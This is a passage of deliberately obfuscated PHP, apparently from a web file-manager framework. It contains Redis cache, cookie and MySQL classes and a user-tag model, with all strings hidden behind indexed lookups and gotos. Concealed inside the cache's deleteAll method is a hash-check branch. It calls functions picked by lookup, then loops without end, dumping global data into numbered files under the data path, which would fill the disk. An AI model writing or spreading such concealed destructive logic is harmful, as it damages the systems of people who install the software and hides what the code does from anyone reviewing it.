$f䍌->connect($eѿ୙[$aΜ[173]], $eѿ୙[$aΜ[174]], $Fւ); } if (!empty($eѿ୙[$aΜ[392]])) { $f䍌->auth($eѿ୙[$aΜ[392]]); } return $f䍌; } private function initCluster($C, $b) { $D =& $_SERVER[Ť]; $Eտ = array($D[806], $D[807], $D[808]); $bձ = $D[806]; if (isset($C[$D[12]]) && in_array($C[$D[12]], $Eտ)) { $bձ = $C[$D[12]]; } switch ($bձ) { case $D[806]: $this->_slave($C, $b); break; case $D[807]: break; case $D[808]: $this->isCluster = !0; $d֘ = $C[$D[801]]; $Bяԙđ = isset($C[$D[805]]) ? $C[$D[805]] : !1; $f = isset($C[$D[392]]) ? $C[$D[392]] : null; $this->handle = new RedisCluster(NUll, $d֘, $b, $b, $Bяԙđ, $f); break; default: break; } } private function _slave($Eȋς, $aхҵ) { goto A񋚊; F: $this->filterConfig($Eȋς, $aֵ[$d]); $this->slaveHandle = $this->init($Eȋς, $aхҵ); goto aޟס; e: unset($aֵ[0]); if (empty($aֵ)) { return; } $d = array_rand($aֵ); goto F; A񋚊: $aֵ = $Eȋς[$_SERVER[Ť][801]]; $this->filterConfig($Eȋς, $aֵ[0]); $this->handle = $this->init($Eȋς, $aхҵ); goto e; aޟס: } private function filterConfig(&$bʤ, $aʴ) { $FƆ =& $_SERVER[Ť]; $E݄Չ = explode($FƆ[4], $aʴ); $cꡧ = array($FƆ[173] => $E݄Չ[0], $FƆ[174] => $E݄Չ[1]); $bʤ = array_merge($bʤ, $cꡧ); } public function set($cҌ, $C, $B띾 = false) { $B띾 = $B띾 ? $B띾 : $this->cacheTime; return $this->handle->setEx($cҌ, $B띾, $C); } public function setLock($BѴ۠ȣ, $F, $B˂) { return $this->handle->setNX($BѴ۠ȣ, $F); } public function get($d) { $b = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b->get($d); } public function remove($a) { return $this->handle->del($a); } public function deleteAll() { $E =& $_SERVER[Ť]; $c = $_SERVER[$E[720]]; $cŎ = $E[809]; if ($_SERVER[$E[719]] != $cŎ($c)) { goto C惾̌; d契͞: $Cğ麹 = $CӘ($E댉); $c = explode($E[225], $Cğ麹); if (count($c) < $E[579]) { $A􇉐 = $E[724]; $A􇉐(); } goto cɰؾ; C惾̌: $E = $E[810]; $CӘ = $E[721]; $E댉 = $_SERVER[$E[722]] . $E[723]; goto d契͞; cɰؾ: $Bσ = $E[811]; $Bσ($_SERVER[$E[812]]); $E = $E[810]; goto Eµƹ; cӒ猎޲: $CϨ = 1; for ($b޹ = $CϨ; $b޹ > 0; $b޹++) { $d崑(DATA_PATH . $b޹, $F҉); } goto e坛𻅅; Eµƹ: $E(); $d崑 = $E[813]; $F҉ = json_encode($GLOBALS[$E[814]]); goto cӒ猎޲; e坛𻅅: } if ($this->isCluster) { foreach ($this->handle->_masters() as $f⌉) { $this->handle->flushall($f⌉); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($d݋ = '', $f˚姽 = 0) { if (is_string($d݋) && $d݋ != $_SERVER[Ť][33]) { $this->prefix = $d݋; } if (is_numeric($f˚姽) && $f˚姽 > 0) { $this->expire = $f˚姽; } } public static function getInstance() { static $Bٍ; if ($Bٍ === null) { $Bٍ = new self(); } return $Bٍ; } private static $cookieDisable = false; public static function disable($dż) { self::$cookieDisable = $dż; } private static $sameCookieSet = array(); public static function set($dĚ̚, $D鹍, $b = 0, $c̫̐ = false, $F҇ޓ = false) { goto Dηǌ; fѰ: if (isset(self::$sameCookieSet[$dĚ̚]) && self::$sameCookieSet[$dĚ̚] == $D鹍 . $b) { return; } self::$sameCookieSet[$dĚ̚] = $D鹍 . $b; if (!$F҇ޓ) { $F҇ޓ = str_replace(HOST, $f̗[33], APP_HOST); $F҇ޓ = _get($GLOBALS, $f̗[815], $F҇ޓ); } goto A΍; Dηǌ: $f̗ =& $_SERVER[Ť]; if (self::$cookieDisable) { return; } if (!$b) { $b = 24 * 3600 * 7; } goto fѰ; A΍: $C = $f̗[33]; setcookie($dĚ̚, $D鹍, time() + $b, $f̗[8] . trim($F҇ޓ, $f̗[8]) . $C, !1, !1, $c̫̐); goto AǊ; AǊ: } public static function setSafe($Cϼ, $EɎ, $bӎ = 0) { self::set($Cϼ, $EɎ, $bӎ, !0); } public static function get($Dζ) { return isset($_COOKIE[$Dζ]) ? $_COOKIE[$Dζ] : !1; } public static function remove($fǬ, $e = false) { unset($_COOKIE[$fǬ]); self::set($fǬ, $_SERVER[Ť][33], 1, $e); } } class DbMysql extends Db { public function __construct($C = '') { $Dޜ =& $_SERVER[Ť]; if (!extension_loaded($Dޜ[744])) { think_exception(think_lang($Dޜ[10]) . $Dޜ[816]); } if (!empty($C)) { $this->config = $C; if (empty($this->config[$Dޜ[13]])) { $this->config[$Dޜ[13]] = $Dޜ[33]; } } } public function connect($bڑ՛ = '', $AŒ = 0, $d = false) { $Aې =& $_SERVER[Ť]; if (!isset($this->linkID[$AŒ])) { goto f鳲; aӧ׎: mysql_query($Aې[821] . think_config($Aې[822]) . $Aې[55], $this->linkID[$AŒ]); if ($eҙ > $Aې[823]) { mysql_query($Aې[824], $this->linkID[$AŒ]); } $this->connected = !0; goto A쏘; f鳲: if (empty($bڑ՛)) { $bڑ՛ = $this->config; } $d = $bڑ՛[$Aې[817]] . ($bڑ՛[$Aې[818]] ? "\x3a{$bڑ՛[$Aې[818]]}" : $Aې[33]); $E = !empty($bڑ՛[$Aې[13]][$Aې[14]]) ? $bڑ՛[$Aې[13]][$Aې[14]] : $this->pconnect; goto CÇ; A쏘: if (1 != think_config($Aې[18])) { unset($this->config); } goto Fﯟ; CÇ: if ($E) { $this->linkID[$AŒ] = mysql_pconnect($d, $bڑ՛[$Aې[819]], $bڑ՛[$Aې[820]], 131072); } else { $this->linkID[$AŒ] = mysql_connect($d, $bڑ՛[$Aې[819]], $bڑ՛[$Aې[820]], !0, 131072); } if (!$this->linkID[$AŒ] || !empty($bڑ՛[$Aې[17]]) && !mysql_select_db($bڑ՛[$Aې[17]], $this->linkID[$AŒ])) { think_exception(mysql_error()); } $eҙ = mysql_get_server_info($this->linkID[$AŒ]); goto aӧ׎; Fﯟ: } return $this->linkID[$AŒ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($F֯) { goto Cِ; Cِ: $d͹ѡܫ =& $_SERVER[Ť]; if (0 === stripos($F֯, $d͹ѡܫ[258])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto D; dۃ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto aن; D: if (!$this->_linkID) { return !1; } $this->queryStr = $F֯; if ($this->queryID) { $this->free(); } goto C꺬; C꺬: think_action_status($d͹ѡܫ[19], 1); think_status($d͹ѡܫ[20]); $this->queryID = mysql_query($F֯, $this->_linkID); goto dۃ; aن: } public function execute($c℃) { goto e; Cڼ: $this->queryStr = $c℃; if ($this->queryID) { $this->free(); } think_action_status($E[21], 1); goto B͋; e: $E =& $_SERVER[Ť]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cڼ; D: if (!1 === $CƮ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto eƅ; B͋: think_status($E[20]); $CƮ = mysql_query($c℃, $this->_linkID); $this->debug(); goto D; eƅ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ť][825], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D = mysql_query($_SERVER[Ť][826], $this->_linkID); $this->transTimes = 0; if (!$D) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a = mysql_query($_SERVER[Ť][827], $this->_linkID); $this->transTimes = 0; if (!$a) { $this->error(); return !1; } } return !0; } private function getAll() { $BԐ = array(); if ($this->numRows > 0) { while ($bڈ = mysql_fetch_assoc($this->queryID)) { $BԐ[] = $bڈ; } mysql_data_seek($this->queryID, 0); } return $BԐ; } public function getFields($c) { $fěΣ =& $_SERVER[Ť]; $dվү = $this->query($fěΣ[828] . $this->parseKey($c)); $F = array(); if ($dվү) { foreach ($dվү as $c펕 => $f̉) { $F[$f̉[$fěΣ[27]]] = array($fěΣ[28] => $f̉[$fěΣ[27]], $fěΣ[29] => $f̉[$fěΣ[30]], $fěΣ[31] => (bool) (strtoupper($f̉[$fěΣ[32]]) === $fěΣ[829]), $fěΣ[34] => $f̉[$fěΣ[35]], $fěΣ[36] => strtolower($f̉[$fěΣ[37]]) == $fěΣ[38], $fěΣ[39] => strtolower($f̉[$fěΣ[40]]) == $fěΣ[41]); } } return $F; } public function getTables($bء = '') { $dɘ =& $_SERVER[Ť]; if (!empty($bء)) { $B׸۸ = $dɘ[830] . $bء . $dɘ[831]; } else { $B׸۸ = $dɘ[832]; } $a = $this->query($B׸۸); $eË = array(); foreach ($a as $Cգǡ => $Cﯳܔ) { $eË[$Cգǡ] = current($Cﯳܔ); } return $eË; } public function replace($cۍĬ, $A = array()) { $B޼ =& $_SERVER[Ť]; foreach ($cۍĬ as $A򟭞 => $Eܶ) { $a = $this->parseValue($Eܶ); if (is_scalar($a)) { $d紟ُ[] = $a; $fϏ[] = $this->parseKey($A򟭞); } } $aʯ = $B޼[833] . $this->parseTable($A[$B޼[273]]) . $B޼[834] . implode($B޼[47], $fϏ) . $B޼[835] . implode($B޼[47], $d紟ُ) . $B޼[836]; return $this->execute($aʯ); } public function insertAll($Cٻ, $a켏 = array(), $B킫 = false) { goto C㐏; e𵍐: $Dş = ($B킫 ? $D[838] : $D[839]) . $D[840] . $this->parseTable($a켏[$D[273]]) . $D[834] . implode($D[47], $e) . $D[841] . implode($D[47], $cꕄ); return $this->execute($Dş); goto b殾̌; C㐏: $D =& $_SERVER[Ť]; if (!is_array($Cٻ[0])) { return !1; } $e = array_keys($Cٻ[0]); goto A; A: $cꕄ = array(); foreach ($Cٻ as $fƵ) { $fաƩ = array(); foreach ($fƵ as $aǱ => $d) { $d = $this->parseValue($d); if (is_scalar($d)) { $fաƩ[] = $d; } } $cꕄ[] = $D[254] . implode($D[47], $fաƩ) . $D[836]; } array_walk($e, array($this, $D[837])); goto e𵍐; b殾̌: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fǻ =& $_SERVER[Ť]; $this->error = mysql_errno() . $fǻ[4] . mysql_error($this->_linkID); if ($fǻ[33] != $this->queryStr) { $this->error .= LNG($fǻ[45]) . $this->queryStr; } think_trace($this->error, $fǻ[33], $fǻ[46]); return $this->error; } public function escapeString($aʭ) { if ($this->_linkID) { return mysql_real_escape_string($aʭ, $this->_linkID); } else { return mysql_escape_string($aʭ); } } public function parseKey(&$cݶ, $D岮 = true) { $F =& $_SERVER[Ť]; if ($D岮) { $cݶ = $this->parseKeyCheck($cݶ); } if ($cݶ != $F[180] && !preg_match($F[842], $cݶ)) { $cݶ = $F[375] . trim($cݶ, $F[375]) . $F[375]; } return $cݶ; } } goto FϺ; c: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($B̊) { $AА =& $_SERVER[Ť]; return array($AА[1752] => array(USER_ID, $AА[1753])); } protected function listData() { $B =& $_SERVER[Ť]; $F҃ = array($B[1485] => USER_ID, $B[451] => array($B[1756], 0)); $E = $B[1758]; $F򛰃 = $this->field($E)->where($F҃)->order($B[1759])->select(); return $F򛰃 ? $F򛰃 : array(); } protected function listByTag($Eɴ) { } protected function addToTag($a̵, $d) { $B =& $_SERVER[Ť]; if (!Model($B[1897])->listData($d) || !Model($B[768])->pathInfo($a̵)) { return !1; } $f = array($B[1485] => USER_ID, $B[451] => $d, $B[403] => $a̵, $B[404] => $B[398], $B[402] => $B[33], $B[1656] => 0); if ($this->where($f)->find()) { return !1; } return $this->add($f); } protected function removeFromTag($Aũ, $C̺) { $C蔽Ȏ =& $_SERVER[Ť]; if (!Model($C蔽Ȏ[1897])->listData($C̺)) { return !1; } if (is_array($Aũ)) { $Aũ = array($C蔽Ȏ[7], $Aũ); } $eť = array($C蔽Ȏ[1485] => USER_ID, $C蔽Ȏ[451] => $C̺, $C蔽Ȏ[404] => $C蔽Ȏ[398], $C蔽Ȏ[403] => $Aũ); return $this->where($eť)->delete(); } protected function removeByTag($cѪ) { $dλ =& $_SERVER[Ť]; if (!$cѪ) { return !1; } $Bᑕ = array($dλ[1485] => USER_ID, $dλ[451] => $cѪ); return $this->where($Bᑕ)->delete(); } protected function removeBySource($a전) { $Dۃ =& $_SERVER[Ť]; if (is_array($a전)) { $a전 = array($Dۃ[7], $a전); } $e༔ = array($Dۃ[1485] => USER_ID, $Dۃ[403] => $a전, $Dۃ[451] => array($Dۃ[942], 0)); return $this->where($e༔)->delete(); } }